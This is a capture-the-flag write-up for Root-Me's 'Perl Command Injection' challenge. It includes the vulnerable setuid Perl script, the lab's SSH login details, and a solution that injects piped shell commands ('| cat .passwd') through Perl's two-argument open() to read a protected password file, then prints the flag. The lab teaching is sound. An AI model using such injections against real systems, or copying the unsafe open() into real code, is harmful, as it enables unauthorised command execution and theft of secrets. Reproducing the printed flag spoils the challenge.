# Perl Command Injection

URL: [https://www.root-me.org/en/Challenges/App-Script/Perl-Command-injection](https://www.root-me.org/en/Challenges/App-Script/Perl-Command-injection)

## Statement

Retrieve the password stored in .passwd.

## Source code

```perl
#!/usr/bin/perl
 
delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';
 
use strict;
use warnings;
 
main();
 
sub main {
    my ($file, $line) = @_;
 
    menu();
    prompt();
 
    while((my $file = <STDIN>)) {
        chomp $file;
        process_file($file);
        prompt();
    }
}
 
sub prompt {
    local $| = 1;
    print ">>> ";
}

sub menu {
    print "*************************\n";
    print "* Stat File Service    *\n";
    print "*************************\n";
}
 
sub check_read_access {
    my $f = shift;
 
    if(-f $f) {
        my $filemode = (stat($f))[2];
        return ($filemode & 4);
    }
 
    return 0;
}
 
sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);
 
    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
 
    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }
 
    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";
 
    close F;
}
```
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                           |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                         |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                             |
| Port       | 2222                                                                                                                                                                                                                                                                                                                            |
| SSH access | [ssh -p 2222 app-script-ch7@challenge02.root-me.org](ssh://app-script-ch7:app-script-ch7@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_931&ssh=ssh://app-script-ch7:app-script-ch7@challenge02 "WebSSH") |
| Username   | app-script-ch7                                                                                                                                                                                                                                                                                                                  |
| Password   | app-script-ch7                                                                                                                                                                                                                                                                                                                  |
## Solution

While looking for vulnerabilities in Perl I came across [perlsec - Perl security](https://perldoc.perl.org/perlsec). `open` function is a bit an odd one out, you can pipe in and out files like bash syntax.

```bash
app-script-ch7@challenge02:~$ ./setuid-wrapper
*************************
* Stat File Service    *
*************************
>>> /etc/hosts
~~~ Statistics for "/etc/hosts" ~~~
Lines: 12
Words: 61
Chars: 341
>>> < /etc/hosts
~~~ Statistics for "< /etc/hosts" ~~~
Lines: 12
Words: 61
Chars: 341
```

[Perl > open](https://perldoc.perl.org/functions/open)

_If MODE is `|-`, then the filename is interpreted as a command to which output is to be piped, and if MODE is `-|`, the filename is interpreted as a command that pipes output to us._

```bash
open(my $fh, "|tr '[a-z]' '[A-Z]'");
```

Using the pipe we can essentially run system commands.

```bash
>>> | echo pwned?
~~~ Statistics for "| echo pwned?" ~~~
Lines: 0
Words: 0
Chars: 0
pwned?
>>> | cat .passwd
~~~ Statistics for "| cat .passwd" ~~~
Lines: 0
Words: 0
Chars: 0
PerlCanDoBetterThanYouThink
```

::: tip Flag
`PerlCanDoBetterThanYouThink`
:::

---

Another interesting approach by rootme@tatw.name

![perl---command-injection.png](/assets/ctf/root-me/perl-command-injection.png)